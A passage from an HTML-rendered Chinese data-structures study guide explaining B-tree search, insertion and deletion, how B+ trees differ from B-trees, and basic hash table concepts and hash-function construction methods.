class="mopen">((</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></li>
</ul>
<p>例如，假设一棵 3 阶 B 树共有 8 个关键字，则其高度范围为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>⩽</mo><mi>h</mi><mo>⩽</mo><mn>3.17</mn></mrow><annotation encoding="application/x-tex">2 \leqslant h \leqslant 3.17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3.17</span></span></span></span>。</p>
</li>
<li>
<p><strong>B 树的查找</strong></p>
<p>在 B 树上进行查找与二叉查找树很相似，只是每个结点都是多个关键字的有序表，在每个结点上所做的不是两路分支决定，而是根据该结点的子树所做的多路分支决定。</p>
<p>B 树的查找包含两个基本操作：一在 B 树中找结点；二在结点内找关键字。由于 B 树常存储在磁盘上，因此前一个查找操作是在磁盘上进行的，而后一个查找操作是在内存中进行的，即在找到目标结点后，先将结点信息读入内存，然后在结点内采用顺序查找法或折半查找法。</p>
<p>在 B 树上查找到某个结点后，先在有序表中进行查找，若找到则查找成功，否则按照对应的指针信息到所指的子树中去查找（例如：在上图中查找关键字 <code>42</code>，首先从根结点开始，根结点只有一个关键字，且 <code>42 &gt; 22</code>，若存在，必在关键字 <code>22</code> 的右边子树上，右孩子结点有两个关键字，而 <code>36 &lt; 42 &lt; 45</code>，则若存在，必在 <code>36</code> 和 <code>45</code> 中间的子树上，在该子结点中查到关键字 <code>42</code>，查找成功）。查找到叶结点时（对应指针为空），则说明树中没有对应的关键字，查找失败。</p>
</li>
<li>
<p><strong>B 树的插入</strong></p>
<p>与二叉查找树的插入操作相比，B 树的插入操作要复杂得多。在 B 树中查找到插入的位置后，并不能简单地将其添加到终端结点（最底层的非叶结点）中，因为此时可能会导致整棵树不再满足 B 树定义中的要求。<strong>将关键字 key 插入 B 树的过程如下：</strong></p>
<ul>
<li><strong>定位</strong>：利用前述的 B 树查找算法，找出插入该关键字的最底层中的某个非叶结点（在 B 树中查找 <code>key</code> 时，会找到表示查找失败的叶结点，这样就确定了最底层非叶结点的插入位置。<strong>注意</strong>：插入位置一定是最底层中的某个非叶结点）</li>
<li><strong>插入</strong>：在 B 树中，每个非失败结点的关键字个数都在区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>m</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[\lceil m / 2 \rceil -1, m - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> 内。插入后的结点关键字个数小于 <code>m</code>，可以直接插入；插入后检查被插入结点内关键字的个数，当插入后的结点关键字个数大于 <code>m - 1</code> 时，必须对结点进行分裂</li>
</ul>
<p><strong>分裂的方法是</strong>：取一个新结点，在插入 <code>key</code> 后的原结点，从中间位置（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span>）将其中的关键字分为两部分，左部分包含的关键字放在原结点中，右部分包含的关键字放到新结点中，中间位置（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span>）的结点插入原结点的父结点。若此时导致其父结点的关键字个数也超过了上限，则继续进行这种分裂操作，直至这个过程传到根结点为止，进而导致 B 树高度增 <code>1</code>。</p>
</li>
<li>
<p><strong>B 树的删除</strong></p>
<p>B 树中的删除操作与插入操作类似，但要稍微复杂一些，即要使得删除后的结点中的关键字个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩾</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\geqslant \lceil m / 2 \rceil - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，因此将涉及结点的 “合并” 问题。</p>
<p>当被删关键字 <code>k</code> 不在终端结点（最底层的非叶结点）中时，可以用 <code>k</code> 的前驱（或后继）<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">k'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 来替代 <code>k</code>，然后在相应的结点中删除 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">k'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>，关键字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">k'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 必定落在某个终端结点中，则转换成了被删关键字在终端结点中的情形。</p>
<p>当被删关键字在终端结点中时，有下列三种情况:</p>
<ul>
<li><strong>直接删除关键字</strong>：若被删关键字所在结点的关键字个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩾</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\geqslant \lceil m / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span>，表明删除该关键字后仍满足 B 树的定义，则直接删去该关键字</li>
<li><strong>兄弟够借</strong>：若被删关键字所在结点删除前的关键字个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">= \lceil m / 2 \rceil - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，且与该结点相邻的右（或左）兄弟结点的关键字个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩾</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\geqslant \lceil m / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span>，则需要调整该结点、右（或左）兄弟结点及其双亲结点（父子换位法），以达到新的平衡</li>
<li><strong>兄弟不够借</strong>：若被删关键字所在结点删除前的关键字个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">= \lceil m / 2 \rceil - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，且此时与该结点相邻的左、右兄弟结点的关键字个数均 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">= \lceil m / 2 \rceil - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，则将关键字删除后与左（或右）兄弟结点及双亲结点中的关键字进行合并</li>
</ul>
<p>在合并过程中，双亲结点中的关键字个数会减 <code>1</code>。若其双亲结点是根结点且关键字个数减少至 <code>0</code>（根结点关键字个数为 <code>1</code> 时，有 <code>2</code> 棵子树），则直接将根结点删除，合并后的新结点成为根；若双亲结点不是根结点，且关键字个数减少到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil - 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>，则又要与它自己的兄弟结点进行调整或合并操作，并重复上述步骤，直至符合 B 树的要求为止。</p>
</li>
</ol>
<h4> B+ 树的基本概念</h4>
<p>B+ 树是应数据库所需而出现的一种 B 树的变形树。</p>
<p>一棵 <code>m</code> 阶的 B+ 树需满足下列条件：</p>
<ul>
<li>每个分支结点最多有 <code>m</code> 棵子树（孩子结点）</li>
<li>非叶根结点至少有两棵子树，其他每个分支结点至少有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span> 棵子树</li>
<li>结点的子树个数与关键字个数相等</li>
<li>所有叶结点包含全部关键字及指向相应记录的指针，叶结点中将关键字按大小顺序排列，并且相邻叶结点按大小顺序相互链接起来</li>
<li>所有分支结点（可视为索引的索引）中仅包含它的各个子结点（即下一级的索引块）中关键字的最大值及指向其子结点的指针</li>
</ul>
<p><code>m</code> 阶的 B+ 树与 <code>m</code> 阶的 B 树的 <strong>主要差异如下：</strong></p>
<ul>
<li>在 B+ 树中，具有 <code>n</code> 个关键字的结点只含有 <code>n</code> 棵子树，即每个关键字对应一棵子树；而在 B 树中，具有 <code>n</code> 个关键字的结点含有 <code>n + 1</code> 棵子树</li>
<li>在 B+ 树中，每个结点（非根内部结点）的关键字个数 <code>n</code> 的范围是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>⩽</mo><mi>n</mi><mo>⩽</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil \leqslant n \leqslant m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>（而根结点：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>⩽</mo><mi>n</mi><mo>⩽</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">1 \leqslant n \leqslant m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>）而在 B 树中，每个结点（非根内部结点）的关键字个数 <code>n</code> 的范围是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn><mo>⩽</mo><mi>n</mi><mo>⩽</mo><mi>m</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil - 1 \leqslant n \leqslant m - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> （根结点：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>⩽</mo><mi>n</mi><mo>⩽</mo><mi>m</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \leqslant n \leqslant m - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>）</li>
<li>在 B+ 树中，叶结点包含了全部关键字，非叶结点中出现的关键字也会出现在叶结点中；而在 B 树中，最外层的终端结点包含的关键字和其他结点包含的关键字是不重复的</li>
<li>在 B+ 树中，叶结点包含信息，所有非叶结点仅起索引作用，非叶结点中的每个索引项只含有对应子树的最大关键字和指向该子树的指针，不含有该关键字对应记录的存储地址</li>
</ul>
<p>B+ 树的查找、插入和删除操作和 B 树的基本类似。只是在查找过程中，非叶结点上的关键字值等于给定值时并不终止，而是继续向下查找，直到叶结点上的该关键字为止。所以，在 B+ 树中查找时，无论查找成功与否，每次查找都是一条从根结点到叶结点的路径。</p>
<h3> 散列表</h3>
<h4> 散列表的基本概念</h4>
<p>在线性表和树表的查找中，记录在表中的位置与记录的关键字之间不存在确定关系，因此，在这些表中查找记录时需进行一系列的关键字比较。这类查找方法建立在 “比较” 的基础上，查找的效率取决于比较的次数。</p>
<p><strong>散列函数</strong>：一个把查找表中的关键字映射成该关键字对应的地址的函数，记为 <code>Hash(key) = Addr</code>（这里的地址可以是数组下标、索引或内存地址等）。</p>
<p>散列函数可能会把两个或两个以上的不同关键字映射到同一地址，称这种情况为 <strong>冲突</strong>，这些发生碰撞的不同关键字称为 <strong>同义词</strong>。一方面，设计得好的散列函数应尽量减少这样的冲突；另一方面，由于这样的冲突总是不可避免的，所以还要设计好处理冲突的方法。</p>
<p><strong>散列表</strong>：根据关键字而直接进行访问的数据结构。也就是说，散列表建立了关键字和存储地址之间的一种直接映射关系。理想情况下，对散列表进行查找的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，即与表中元素的个数无关。</p>
<h4> 散列函数的构造方法</h4>
<p>在构造散列函数时，必须注意以下几点：</p>
<ul>
<li>散列函数的定义域必须包含全部需要存储的关键字，而值域的范围则依赖于散列表的大小或地址范围</li>
<li>散列函数计算出来的地址应该能等概率、均匀地分布在整个地址空间中，从而减少冲突的发生</li>
<li>散列函数应尽量简单，能够在较短的时间内计算出任意一个关键字对应的散列地址</li>
</ul>
<p><strong>常用的散列函数如下：</strong></p>
<ol>
<li>
<p><strong>直接定址法</strong></p>
<p>直接取关键字的某个线性函数值为散列地址，散列函数为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mi>e</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">H(key) = key</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>a</mi><mo>×</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">H(key) = a \times key + b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 式中，<code>a</code> 和 <code>b</code> 是常数。这种方法计算最简单，且不会产生冲突。它适合关键字的分布基本连续的情况，若关键字分布不连续，空位较多，则会造成存储空间的浪费。</p>
</li>
<li>
<p><strong>除留余数法</strong></p>
<p>这是一种最简单、最常用的方法，假定散列表表长为 <code>m</code>，取一个不大于 <code>m</code> 但最接近或等于 <code>m</code> 的质数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>，利用以下公式把关键字转换成散列地址。散列函数为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mi>e</mi><mi>y</mi><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">H(key) = key \% p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9444em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span> 除留余数法的关键是选好 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>，使得每个关键字通过该函数转换后等概率地映射到散列空间上的任意一个地址，从而尽可能减少冲突的可能性。</p>
</li>
<li>
